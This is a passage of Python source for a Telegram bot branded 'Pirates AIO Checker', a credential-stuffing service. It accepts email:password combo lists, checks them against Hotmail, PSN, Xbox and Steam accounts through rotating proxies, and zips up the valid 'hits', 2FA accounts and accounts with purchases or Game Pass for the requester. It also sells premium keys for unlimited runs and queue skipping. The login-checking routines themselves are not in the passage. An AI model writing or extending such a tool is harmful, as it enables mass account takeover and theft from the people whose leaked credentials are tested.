                InputFile(io.BytesIO(zb), filename=f"hotmail_hits_{len(hits)}_accounts.zip"),
                caption=(f"📦 <b>Hotmail results</b> ({mode_label})\n"
                         f"👤 Checked by: <code>{html.escape(self.checker)}</code>\n"
                         f"🌐 Proxy: <code>{'on' if self.use_proxy else 'off'}</code>\n"
                         f"🎯 Hits: <code>{len(hits)}</code>\n"
                         f"📁 Files: <code>{len(files)}</code>\n"
                         f"📦 Size: <code>{len(zb)} bytes</code>"),
                parse_mode=ParseMode.HTML)
        except Exception: pass

    async def _export_psn(self):
        if not self.psn_hits and not self.twofa_list:
            await self.app.bot.send_message(self.chat_id, "📭 No valid logins this run.")
            return
        with self.lock:
            hits   = list(self.psn_hits)
            twofas = list(self.twofa_list)
        real_psn = [h for h in hits if h.get("psn_orders", 0) > 0]
        free     = [h for h in hits if h.get("psn_orders", 0) == 0]
        files = await asyncio.to_thread(build_psn_files, hits, self.checker)
        if twofas:
            lines = [ADS_HEADER,
                     "# PSN CHECKER — 2FA ACCOUNTS",
                     f"# Checked by: {self.checker}",
                     f"# Generated: {datetime.now()}", ""]
            for i, t in enumerate(twofas, 1):
                lines.append(f"{i:03d}. {t['email']}:{t['pass']}")
            files["2fa.txt"] = "\n".join(lines) + "\n"
        if not real_psn and not twofas:
            try:
                await self.app.bot.send_document(
                    self.chat_id,
                    InputFile(io.BytesIO(files["free.txt"].encode("utf-8")),
                              filename="free_logins.txt"),
                    caption=(f"📥 <b>No PSN accounts with orders</b>\n"
                             f"👤 Checked by: <code>{html.escape(self.checker)}</code>\n"
                             f"⚪ Valid logins (FREE): <code>{len(free)}</code>\n"
                             f"🎮 PSN with orders: <code>0</code>"),
                    parse_mode=ParseMode.HTML)
            except Exception: pass
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for name, content in files.items():
                z.writestr(name, content.encode("utf-8"))
        zb = buf.getvalue()
        try:
            await self.app.bot.send_document(
                self.chat_id,
                InputFile(io.BytesIO(zb), filename=f"psn_hits_{len(real_psn)}_accounts.zip"),
                caption=(f"📦 <b>PSN results</b>\n"
                         f"👤 Checked by: <code>{html.escape(self.checker)}</code>\n"
                         f"🌐 Proxy: <code>{'on' if self.use_proxy else 'off'}</code>\n"
                         f"🎮 PSN accounts (orders > 0): <code>{len(real_psn)}</code>\n"
                         f"⚪ FREE (no orders): <code>{len(free)}</code>\n"
                         f"🔐 2FA: <code>{len(twofas)}</code>\n"
                         f"📁 Files: <code>{len(files)}</code>\n"
                         f"📦 Size: <code>{len(zb)} bytes</code>"),
                parse_mode=ParseMode.HTML)
        except Exception: pass

    async def _export_xbox(self):
        if not self.xbox_hits:
            await self.app.bot.send_message(self.chat_id, "📭 No hits this run.")
            return
        with self.lock: hits = list(self.xbox_hits)
        files = await asyncio.to_thread(build_xbox_files, hits, self.checker)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for name, content in files.items():
                z.writestr(name, content.encode("utf-8"))
        zb = buf.getvalue()
        gp = sum(1 for h in hits if h.get("type") in (
            "Xbox Game Pass Ultimate","Xbox Game Pass Premium",
            "Xbox Game Pass Essential","Xbox Game Pass"))
        mc = sum(1 for h in hits if h.get("type") == "Minecraft")
        gs = sum(1 for h in hits if h.get("type") == "gscore")
        try:
            await self.app.bot.send_document(
                self.chat_id,
                InputFile(io.BytesIO(zb), filename=f"xbox_hits_{len(hits)}_accounts.zip"),
                caption=(f"📦 <b>Xbox results</b>\n"
                         f"👤 Checked by: <code>{html.escape(self.checker)}</code>\n"
                         f"🌐 Proxy: <code>{'on' if self.use_proxy else 'off'}</code>\n"
                         f"🎯 Hits: <code>{len(hits)}</code>\n"
                         f"👑 Game Pass: <code>{gp}</code>\n"
                         f"⛏️ Minecraft: <code>{mc}</code>\n"
                         f"🏆 G-Score: <code>{gs}</code>\n"
                         f"📁 Files: <code>{len(files)}</code>\n"
                         f"📦 Size: <code>{len(zb)} bytes</code>"),
                parse_mode=ParseMode.HTML)
        except Exception: pass

    async def _export_steam(self):
        if not self.steam_hits:
            await self.app.bot.send_message(self.chat_id, "📭 No hits this run.")
            return
        with self.lock: hits = list(self.steam_hits)
        files = await asyncio.to_thread(build_steam_files, hits, self.checker)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for name, content in files.items():
                z.writestr(name, content.encode("utf-8"))
        zb = buf.getvalue()
        valid = sum(1 for h in hits if h.get("type") == "steam_hit")
        free  = sum(1 for h in hits if h.get("type") == "steam_free")
        two   = sum(1 for h in hits if h.get("type") == "steam_2fa")
        ban   = sum(1 for h in hits if h.get("type") == "steam_ban")
        try:
            await self.app.bot.send_document(
                self.chat_id,
                InputFile(io.BytesIO(zb), filename=f"steam_hits_{valid}_accounts.zip"),
                caption=(f"📦 <b>Steam results</b>\n"
                         f"👤 Checked by: <code>{html.escape(self.checker)}</code>\n"
                         f"🌐 Proxy: <code>{'on' if self.use_proxy else 'off'}</code>\n"
                         f"🎮 Valid: <code>{valid}</code>\n"
                         f"🆓 Free: <code>{free}</code>\n"
                         f"🔐 2FA: <code>{two}</code>\n"
                         f"🚫 Banned: <code>{ban}</code>\n"
                         f"📁 Files: <code>{len(files)}</code>\n"
                         f"📦 Size: <code>{len(zb)} bytes</code>"),
                parse_mode=ParseMode.HTML)
        except Exception: pass

# ── queue runners ───────────────────────────────────────────────────────────
async def _run_premium(job: "Job"):
    global ACTIVE_PREMIUM
    try:
        await job.run()
    finally:
        with QUEUE_LOCK:
            ACTIVE_PREMIUM = max(0, ACTIVE_PREMIUM - 1)
        asyncio.create_task(_pump_free_queue())

async def _pump_free_queue():
    global ACTIVE_FREE
    with QUEUE_LOCK:
        if ACTIVE_FREE or not FREE_QUEUE: return
        if ACTIVE_PREMIUM > 0: return
        ACTIVE_FREE = True
        chat_id, uid, combos, app, checker, mode, kw, use_proxy = FREE_QUEUE.popleft()

    job = Job(chat_id, combos, app, checker, mode,
              keywords=kw, use_proxy=use_proxy, proxy_uid=uid)
    SESSIONS[chat_id] = job

    labels = {"psn": "🎮 PSN", "xbox": "🕹️ Xbox", "steam": "🎯 Steam", "hotmail": "📧 Hotmail"}
    label = labels.get(mode, "📧 Hotmail")
    if mode == "hotmail" and kw:
        label = f"📧 Hotmail ({len(kw)} keywords)"
    try:
        await app.bot.send_message(
            chat_id,
            f"🚀 <b>{label} starting</b> — <code>{len(combos)}</code> combos\n"
            f"🌐 Proxy: <code>{'on' if use_proxy else 'off'}</code>\n"
            f"👤 Checked by: <code>{html.escape(checker)}</code>",
            parse_mode=ParseMode.HTML)
    except Exception: pass

    try:
        await job.run()
    finally:
        with QUEUE_LOCK:
            ACTIVE_FREE = False
        asyncio.create_task(_pump_free_queue())
        await _notify_queue_moved()

async def _notify_queue_moved():
    with QUEUE_LOCK: snapshot = list(FREE_QUEUE)
    if _BOT_REF is None: return
    for i, item in enumerate(snapshot, 1):
        chat_id = item[0]
        try:
            await _BOT_REF.send_message(
                chat_id,
                f"📢 <b>Queue moved</b> — you are now <code>#{i}</code> in line.",
                parse_mode=ParseMode.HTML)
        except Exception: pass

# ── UI ──────────────────────────────────────────────────────────────────────
def main_menu_kb(user_id):
    rows = [
        [InlineKeyboardButton("🔎 Checkers",   callback_data="checkers")],
        [InlineKeyboardButton("📊 My Status",  callback_data="my_status"),
         InlineKeyboardButton("🎟 My Quota",   callback_data="my_quota")],
        [InlineKeyboardButton("📋 Queue",      callback_data="queue_view"),
         InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")],
        [InlineKeyboardButton("🌐 Proxy Settings", callback_data="proxy_menu")],
        [InlineKeyboardButton(f"📢 {CHANNEL_NAME}", url=CHANNEL_URL),
         InlineKeyboardButton(f"💬 {CHAT_NAME}",    url=CHAT_URL)],
    ]
    if user_id == OWNER_ID:
        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

def checkers_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 Hotmail Checker", callback_data="new_job_hotmail")],
        [InlineKeyboardButton("🎮 PSN Checker",     callback_data="new_job_psn")],
        [InlineKeyboardButton("🕹️ Xbox Checker",    callback_data="new_job_xbox")],
        [InlineKeyboardButton("🎯 Steam Checker",   callback_data="new_job_steam")],
        [InlineKeyboardButton("◀ Back",             callback_data="back_main")],
    ])

def hotmail_mode_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Default services",   callback_data="hotmail_default")],
        [InlineKeyboardButton("📝 Custom keywords",    callback_data="hotmail_custom")],
        [InlineKeyboardButton("◀ Back",                callback_data="checkers")],
    ])

def hotmail_custom_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⌨️ Type keywords",       callback_data="hotmail_typed")],
        [InlineKeyboardButton("📎 Upload keywords.txt", callback_data="hotmail_upload")],
        [InlineKeyboardButton("◀ Back",                 callback_data="new_job_hotmail")],
    ])

def proxy_menu_kb(uid: int):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📎 Upload proxies.txt",   callback_data="proxy_upload")],
        [InlineKeyboardButton("⌨️ Paste proxies",        callback_data="proxy_paste")],
        [InlineKeyboardButton("🌐 Set type: HTTP",        callback_data="proxy_type_http")],
        [InlineKeyboardButton("🔷 Set type: SOCKS4",      callback_data="proxy_type_socks4")],
        [InlineKeyboardButton("🔶 Set type: SOCKS5",      callback_data="proxy_type_socks5")],
        [InlineKeyboardButton("📊 Show my proxies",       callback_data="proxy_show")],
        [InlineKeyboardButton("🗑 Clear my proxies",      callback_data="proxy_clear")],
        [InlineKeyboardButton("◀ Back",                   callback_data="back_main")],
    ])

def admin_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key",     callback_data="admin_genkey"),
         InlineKeyboardButton("📋 List Keys",   callback_data="admin_listkeys")],
        [InlineKeyboardButton("📢 Broadcast",   callback_data="admin_broadcast"),
         InlineKeyboardButton("👥 Users",       callback_data="admin_users")],
        [InlineKeyboardButton("📥 Import IDs",  callback_data="admin_import"),
         InlineKeyboardButton("🚫 Remove User", callback_data="admin_remove")],
        [InlineKeyboardButton("📊 Global Stats",callback_data="admin_stats"),
         InlineKeyboardButton("🎟 Reset Quota", callback_data="admin_resetquota")],
        [InlineKeyboardButton("◀ Back",         callback_data="back_main")],
    ])

def back_kb(target="admin"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀ Back", callback_data=target)]])

async def _require_access(update, ctx, mode: str = None):
    uid = update.effective_user.id if update.effective_user else 0
    if has_access(uid): return True
    if mode is None: return True
    rem = quota_remaining(uid, mode)
    if rem is None or rem > 0: return True
    text = (
        f"⛔ <b>Daily free-tier limit reached</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Mode: <code>{mode}</code>\n"
        f"🎟 Free tier resets at midnight UTC.\n"
        f"🔑 Redeem a key for <b>unlimited</b> access."
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")],
        [InlineKeyboardButton("🎟 My Quota",   callback_data="my_quota")],
        [InlineKeyboardButton(f"📢 {CHANNEL_NAME}", url=CHANNEL_URL)],
    ])
    if update.callback_query:
        try: await update.callback_query.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception: pass
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    return False

# ── commands ────────────────────────────────────────────────────────────────
def _welcome_text(uid: int, name: str) -> str:
    status = user_status(uid)
    if status["role"] == "OWNER":
        status_line = "👑 <b>Owner</b> — full access"
    elif has_access(uid):
        status_line = f"🟢 <b>Premium</b> — expires in <code>{fmt_until(status['until'])}</code>"
    else:
        status_line = "🟡 <b>Free tier</b> — daily limits + queue"

    npx = len(user_proxies(uid))
    px_line = f"🌐 Proxies: <code>{npx}</code> · type <code>{user_proxy_type(uid)}</code>" if npx else "🌐 Proxies: <code>none</code>"

    return (
        f"╔══════════════════════════════════╗\n"
        f"║  📢 <a href=\"{CHANNEL_URL}\">{CHANNEL_NAME}</a>\n"
        f"║  💬 <a href=\"{CHAT_URL}\">{CHAT_NAME}</a>\n"
        f"╚══════════════════════════════════╝\n\n"
        f"🏴‍☠️ <b>Welcome aboard, {html.escape(name)}!</b>\n"
        f"<i>Pirates AIO Checker — revived edition</i>\n"
        f"👑 <b>Owner</b>: <b>{OWNER_TAG}</b>\n\n"
        f"╭─ <b>🔎 Checkers</b> ─────────────\n"
        f"│ 📧 <b>Hotmail Inboxer</b>\n"
        f"│    <i>Service detection + custom keywords</i>\n"
        f"│ 🎮 <b>PSN</b> — Sony order history\n"
        f"│ 🕹️ <b>Xbox</b> — Game Pass · MC · GScore\n"
        f"│ 🎯 <b>Steam</b> — Games · Wallet · Country\n"
        f"╰──────────────────────────────────\n\n"
        f"╭─ <b>⚡ Perks</b> ─────────────────\n"
        f"│ 📊 Live animated progress\n"
        f"│ 📦 One zip per run · ads on every file\n"
        f"│ 🌐 Per-user proxies · with or without\n"
        f"│ 🎟 Free tier: daily limits per mode\n"
        f"│ 👑 Premium: unlimited + queue skip\n"
        f"╰──────────────────────────────────\n\n"
        f"👤 <b>Status</b>: {status_line}\n"
        f"{px_line}\n\n"
        f"Tap <b>🔎 Checkers</b> to begin."
    )

async def cmd_start(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    uid = update.effective_user.id if update.effective_user else 0
    name = update.effective_user.first_name if update.effective_user else "there"

    try:
        if LOGO_FILE.exists():
            with open(LOGO_FILE, "rb") as f:
                await update.message.reply_photo(
                    photo=InputFile(f, filename="logo.png"),
                    caption=(f"🏴‍☠️ <b>Pirates AIO Checker</b>\n"
                             f"👑 Owner: <b>{OWNER_TAG}</b>\n"
                             f"📢 <a href=\"{CHANNEL_URL}\">{CHANNEL_NAME}</a> · "
                             f"<a href=\"{CHAT_URL}\">{CHAT_NAME}</a>"),
                    parse_mode=ParseMode.HTML)
    except Exception: pass

    try:
        await update.message.reply_text(
            _welcome_text(uid, name),
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb(uid),
            disable_web_page_preview=True)
    except Exception:
        await update.message.reply_text(
            _welcome_text(uid, name).replace(f'<a href="{CHANNEL_URL}">','').replace('</a>',''),
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb(uid),
            disable_web_page_preview=True)

async def cmd_newjob(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    await update.message.reply_text("🔎 <b>Checkers</b>\nPick a mode:",
        parse_mode=ParseMode.HTML, reply_markup=checkers_menu_kb())

async def cmd_psn(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    await _prompt_combos(update, ctx, "psn")

async def cmd_xbox(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    await _prompt_combos(update, ctx, "xbox")

async def cmd_steam(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    await _prompt_combos(update, ctx, "steam")

async def cmd_hotmail(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    await update.message.reply_text("📧 <b>Hotmail checker</b>\nPick a keyword source:",
        parse_mode=ParseMode.HTML, reply_markup=hotmail_mode_kb())

# ── _prompt_combos — first prompt with proxy toggle buttons ────────────────
async def _prompt_combos(update, ctx, mode, keywords=None):
    if not await _require_access(update, ctx, mode): return
    chat_id = update.effective_chat.id
    target = update.callback_query.message if update.callback_query else update.message
    if chat_id in SESSIONS and SESSIONS[chat_id].running:
        await target.reply_text("⚠️ A job is already running. /stop first.")
        return
    ctx.user_data["awaiting_combos"] = True
    ctx.user_data["pending_mode"] = mode
    ctx.user_data.setdefault("use_proxy", False)
    if keywords:
        ctx.user_data["pending_keywords"] = keywords

    labels = {"psn": "🎮 PSN", "xbox": "🕹️ Xbox", "steam": "🎯 Steam", "hotmail": "📧 Hotmail"}
    label = labels.get(mode, "📧 Hotmail")
    if mode == "hotmail" and keywords:
        label = f"📧 Hotmail ({len(keywords)} keywords)"
    uid = update.effective_user.id if update.effective_user else 0
    ps = user_proxies(uid)
    proxy_line = (f"🌐 Proxies loaded: <code>{len(ps)}</code> · type <code>{user_proxy_type(uid)}</code>"
                  if ps else "🚫 Proxies loaded: <code>0</code>")
    await target.reply_text(
        f"{label} <b>mode</b> selected.\n"
        f"{_quota_banner(uid, mode)}\n"
        f"{proxy_line}\n\n"
        f"📥 Send combos (<code>email:password</code>) or upload a .txt file.\n\n"
        f"⚙️ Choose proxy mode below, then send the file:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 With Proxy",     callback_data="toggle_proxy_on"),
             InlineKeyboardButton("🚫 Without Proxy",  callback_data="toggle_proxy_off")],
            [InlineKeyboardButton("📎 Load proxies",   callback_data="proxy_menu")],
        ]))

# ── _combos_prompt_only — after toggle, no proxy buttons ───────────────────
async def _combos_prompt_only(update, ctx, mode, keywords=None):
    chat_id = update.effective_chat.id
    target = update.callback_query.message if update.callback_query else update.message
    labels = {"psn": "🎮 PSN", "xbox": "🕹️ Xbox", "steam": "🎯 Steam", "hotmail": "📧 Hotmail"}
    label = labels.get(mode, "📧 Hotmail")
    if mode == "hotmail" and keywords:
        label = f"📧 Hotmail ({len(keywords)} keywords)"
    uid = update.effective_user.id if update.effective_user else 0
    ps = user_proxies(uid)
    using = ctx.user_data.get("use_proxy", False)
    if using and ps:
        proxy_line = f"🌐 Proxies loaded: <code>{len(ps)}</code> · will use <b>with proxy</b>"
    elif using and not ps:
        proxy_line = "⚠️ Proxies loaded: <code>0</code> — will fall back to <b>direct</b>"
    else:
        proxy_line = "🚫 Proxies loaded: <code>0</code> · will run <b>direct</b>"
    await target.reply_text(
        f"{label} <b>ready</b>\n"
        f"{_quota_banner(uid, mode)}\n"
        f"{proxy_line}\n\n"
        f"📥 Now send combos (<code>email:password</code>) or upload a .txt file.",
        parse_mode=ParseMode.HTML)

async def cmd_proxy(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    uid = update.effective_user.id
    ps = user_proxies(uid); ptype = user_proxy_type(uid)
    lines = [f"🌐 <b>Proxy Settings</b>\n",
             f"👤 Your proxies: <code>{len(ps)}</code>",
             f"🔧 Type: <code>{ptype}</code>"]
    if ps:
        lines.append("\n<b>Sample (first 5):</b>")
        for i, p in enumerate(ps[:5], 1):
            lines.append(f"{i}. <code>{html.escape(p)}</code>")
        if len(ps) > 5: lines.append(f"… +{len(ps)-5} more")
    else:
        lines.append("\n<i>No proxies loaded.</i>")
    await update.message.reply_text("\n".join(lines),
        parse_mode=ParseMode.HTML, reply_markup=proxy_menu_kb(uid))

async def handle_document(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    if ctx.user_data.get("awaiting_proxy_file"):
        await _handle_proxy_file(update, ctx); return
    if ctx.user_data.get("awaiting_keywords_file"):
        await _handle_keywords_file(update, ctx); return
    if not ctx.user_data.get("awaiting_combos"): return
    mode = ctx.user_data.get("pending_mode", "hotmail")
    if not await _require_access(update, ctx, mode): return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files.")
        return
    f = await doc.get_file()
    buf = io.BytesIO(); await f.download_to_memory(buf)
    await _start_job_from_text(update, ctx, buf.getvalue().decode("utf-8", errors="ignore"))

async def handle_text(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    if ctx.user_data.get("awaiting_proxy_text"):
        await _handle_proxy_text(update, ctx); return
    if ctx.user_data.get("awaiting_keywords"):
        await _handle_keywords_input(update, ctx); return
    if ctx.user_data.get("awaiting_key"):
        await _handle_key_input(update, ctx); return
    if ctx.user_data.get("admin_genkey"):
        await _handle_genkey_single(update, ctx); return
    if ctx.user_data.get("admin_broadcast"):
        await _handle_broadcast(update, ctx); return
    if ctx.user_data.get("admin_remove"):
        await _handle_remove(update, ctx); return
    if ctx.user_data.get("admin_import"):
        await _handle_import(update, ctx); return
    if ctx.user_data.get("admin_resetquota"):
        await _handle_resetquota(update, ctx); return
    if not ctx.user_data.get("awaiting_combos"): return
    mode = ctx.user_data.get("pending_mode", "hotmail")
    if not await _require_access(update, ctx, mode): return
    await _start_job_from_text(update, ctx, update.message.text)

async def _handle_proxy_text(update, ctx):
    ctx.user_data["awaiting_proxy_text"] = False
    uid = update.effective_user.id
    raw = update.message.text or ""
    if raw.strip().lower() == "cancel":
        await update.message.reply_text("❌ Proxy paste cancelled."); return
    plist = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or ":" not in line: continue
        plist.append(line)
        if len(plist) >= 500: break
    if not plist:
        await update.message.reply_text("❌ No valid proxies found. Format: <code>ip:port</code>",
            parse_mode=ParseMode.HTML); return
    add_user_proxies(uid, plist)
    await update.message.reply_text(
        f"✅ <b>{len(plist)} proxies added.</b>\n"
        f"🌐 Total: <code>{len(user_proxies(uid))}</code>",
        parse_mode=ParseMode.HTML, reply_markup=proxy_menu_kb(uid))

async def _handle_proxy_file(update, ctx):
    ctx.user_data["awaiting_proxy_file"] = False
    uid = update.effective_user.id
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files."); return
    f = await doc.get_file()
    buf = io.BytesIO(); await f.download_to_memory(buf)
    raw = buf.getvalue().decode("utf-8", errors="ignore")
    plist = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or ":" not in line: continue
        plist.append(line)
        if len(plist) >= 500: break
    if not plist:
        await update.message.reply_text("❌ No valid proxies found in the file.",
            parse_mode=ParseMode.HTML); return
    add_user_proxies(uid, plist)
    await update.message.reply_text(
        f"✅ <b>{len(plist)} proxies loaded from file.</b>\n"
        f"🌐 Total: <code>{len(user_proxies(uid))}</code>",
        parse_mode=ParseMode.HTML, reply_markup=proxy_menu_kb(uid))

async def _handle_keywords_input(update, ctx):
    ctx.user_data["awaiting_keywords"] = False
    raw = update.message.text or ""
    kws = [l.strip() for l in raw.splitlines() if l.strip()]
    kws = [k for k in kws if len(k) >= 3][:50]
    if not kws:
        await update.message.reply_text("❌ No valid keywords found. Send at least one non-empty line.",
            parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f"✅ <b>{len(kws)} keywords loaded.</b>\n\n"
        f"Now send combos (<code>email:password</code>) or upload a .txt file.",
        parse_mode=ParseMode.HTML)
    ctx.user_data["awaiting_combos"] = True
    ctx.user_data["pending_mode"] = "hotmail"
    ctx.user_data["pending_keywords"] = kws

async def _handle_keywords_file(update, ctx):
    ctx.user_data["awaiting_keywords_file"] = False
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only .txt files."); return
    f = await doc.get_file()
    buf = io.BytesIO(); await f.download_to_memory(buf)
    raw = buf.getvalue().decode("utf-8", errors="ignore")
    kws = [l.strip() for l in raw.splitlines() if l.strip()]
    kws = [k for k in kws if len(k) >= 3][:50]
    if not kws:
        await update.message.reply_text("❌ No valid keywords found in the file.",
            parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f"✅ <b>{len(kws)} keywords loaded from file.</b>\n\n"
        f"Now send combos (<code>email:password</code>) or upload a .txt file.",
        parse_mode=ParseMode.HTML)
    ctx.user_data["awaiting_combos"] = True
    ctx.user_data["pending_mode"] = "hotmail"
    ctx.user_data["pending_keywords"] = kws

def _checker_label(update):
    u = update.effective_user
    if not u: return "unknown"
    if u.username: return f"@{u.username}"
    name = (u.full_name or "").strip()
    if name: return f"{name} (id:{u.id})"
    return f"id:{u.id}"

async def _start_job_from_text(update, ctx, text):
    ctx.user_data["awaiting_combos"] = False
    mode = ctx.user_data.pop("pending_mode", "hotmail")
    kw = ctx.user_data.pop("pending_keywords", None) if mode == "hotmail" else None
    use_proxy = bool(ctx.user_data.get("use_proxy", False))
    combos = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line: continue
        e, p = line.split(":", 1)
        combos.append((e.strip(), p.strip()))
    if not combos:
        await update.message.reply_text("❌ No valid combos found."); return
    if not await _require_join(update, ctx): return

    uid = update.effective_user.id if update.effective_user else 0

    if use_proxy and not user_proxies(uid):
        await update.message.reply_text(
            "⚠️ <b>Proxy mode on</b> but no proxies loaded — running direct.\n"
            "Add proxies via 🌐 Proxy Settings.",
            parse_mode=ParseMode.HTML)
        use_proxy = False

    rem = quota_remaining(uid, mode)
    if rem is not None and len(combos) > rem:
        if rem <= 0:
            await update.message.reply_text(
                f"⛔ <b>Daily limit reached</b> for <code>{mode}</code>.\n"
                f"🎟 Free tier resets at midnight UTC.\n"
                f"🔑 Redeem a key for <b>unlimited</b> access.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))
            return
        await update.message.reply_text(
            f"⚠️ <b>Free tier cap</b> — file has <code>{len(combos)}</code> lines, "
            f"only <code>{rem}</code> remain today.\n"
            f"Checking the first <code>{rem}</code> lines.",
            parse_mode=ParseMode.HTML)
        combos = combos[:rem]

    quota_consume(uid, mode, len(combos))

    chat_id = update.effective_chat.id
    checker = _checker_label(update)
    labels = {"psn": "🎮 PSN", "xbox": "🕹️ Xbox", "steam": "🎯 Steam", "hotmail": "📧 Hotmail"}
    label = labels.get(mode, "📧 Hotmail")
    if mode == "hotmail" and kw:
        label = f"📧 Hotmail ({len(kw)} keywords)"

    is_premium = has_access(uid)
    if is_premium:
        global ACTIVE_PREMIUM
        with QUEUE_LOCK:
            if ACTIVE_PREMIUM >= MAX_PREMIUM_PARALLEL:
                too_many = True
            else:
                ACTIVE_PREMIUM += 1
                too_many = False
        if too_many:
            await update.message.reply_text(
                f"⏳ <b>Priority slots busy</b> ({MAX_PREMIUM_PARALLEL}/{MAX_PREMIUM_PARALLEL})\n"
                f"Try again in a minute — slots free as runs finish.",
                parse_mode=ParseMode.HTML)
            return
        job = Job(chat_id, combos, ctx.application, checker, mode,
                  keywords=kw, use_proxy=use_proxy, proxy_uid=uid)
        SESSIONS[chat_id] = job
        await update.message.reply_text(
            f"⚡ <b>{label} starting</b> — <code>{len(combos)}</code> combos\n"
            f"👑 <b>Priority slot</b> — no queue\n"
            f"🌐 Proxy: <code>{'on' if use_proxy else 'off'}</code>\n"
            f"👤 Checked by: <code>{html.escape(checker)}</code>",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(_run_premium(job))
        return

    with QUEUE_LOCK:
        FREE_QUEUE.append((chat_id, uid, combos, ctx.application, checker, mode, kw, use_proxy))
        premium_active = ACTIVE_PREMIUM
        free_active = ACTIVE_FREE
        my_pos = len(FREE_QUEUE) + (0 if ACTIVE_FREE else 0)

    reason = ""
    if premium_active > 0:
        reason = f"\n⏳ <i>Waiting behind {premium_active} premium job(s).</i>"
    elif free_active:
        reason = "\n⏳ <i>Waiting behind another free job.</i>"

    await update.message.reply_text(
        f"📥 <b>{label} queued</b> — <code>{len(combos)}</code> combos\n"
        f"🎟 <b>Position:</b> <code>#{my_pos}</code>"
        f"{reason}\n"
        f"🌐 Proxy: <code>{'on' if use_proxy else 'off'}</code>\n"
        f"👤 Checked by: <code>{html.escape(checker)}</code>\n\n"
        f"👑 Premium users skip this line.\n"
        f"🔑 Redeem a key for instant access.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))

    asyncio.create_task(_pump_free_queue())

async def cmd_status(update, ctx):
    if not await _require_join(update, ctx): return
    job = SESSIONS.get(update.effective_chat.id)
    if not job:
        await update.message.reply_text("No active job. /newjob to start."); return
    await update.message.reply_text(job._status_text(),
        parse_mode=ParseMode.HTML, reply_markup=job._buttons())

async def cmd_stop(update, ctx):
    if not await _require_join(update, ctx): return
    job = SESSIONS.get(update.effective_chat.id)
    if job and job.running:
        job.running = False
        await update.message.reply_text("🛑 Stop signal sent — sending hits…")
    else:
        await update.message.reply_text("Nothing to stop.")

async def cmd_help(update, ctx):
    if not await _require_join(update, ctx): return
    await update.message.reply_text(
        "📖 <b>Commands</b>\n"
        "/start    — main menu\n"
        "/newjob   — pick checkers\n"
        "/hotmail  — Hotmail (default or custom keywords)\n"
        "/psn      — PSN mode\n"
        "/xbox     — Xbox mode\n"
        "/steam    — Steam mode\n"
        "/status   — live status\n"
        "/stop     — stop job + send hits\n"
        "/mykey    — show my key status\n"
        "/quota    — my daily free-tier quota\n"
        "/queue    — view queue status\n"
        "/proxy    — manage my proxies\n"
        "/redeem   — redeem a key\n"
        "/help     — this menu",
        parse_mode=ParseMode.HTML)

async def cmd_mykey(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    uid = update.effective_user.id
    s = user_status(uid)
    if s["role"] == "OWNER":
        await update.message.reply_text("👑 <b>Owner</b> — no key needed.", parse_mode=ParseMode.HTML)
        return
    if not s["until"] or s["until"] <= time.time():
        await update.message.reply_text(
            "🟡 <b>Free tier</b>\n"
            "Daily limits apply per mode (see /quota).\n"
            "Free users wait in queue while premium runs are active.\n\n"
            "🔑 Redeem a key for unlimited + queue skip.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))
        return
    await update.message.reply_text(
        f"🟢 <b>Premium active</b>\n"
        f"⏱ Expires in: <code>{fmt_until(s['until'])}</code>\n"
        f"🔑 Keys used: <code>{len(s['keys'])}</code>\n"
        f"♾ Unlimited checks + queue skip",
        parse_mode=ParseMode.HTML)

async def cmd_quota(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    uid = update.effective_user.id
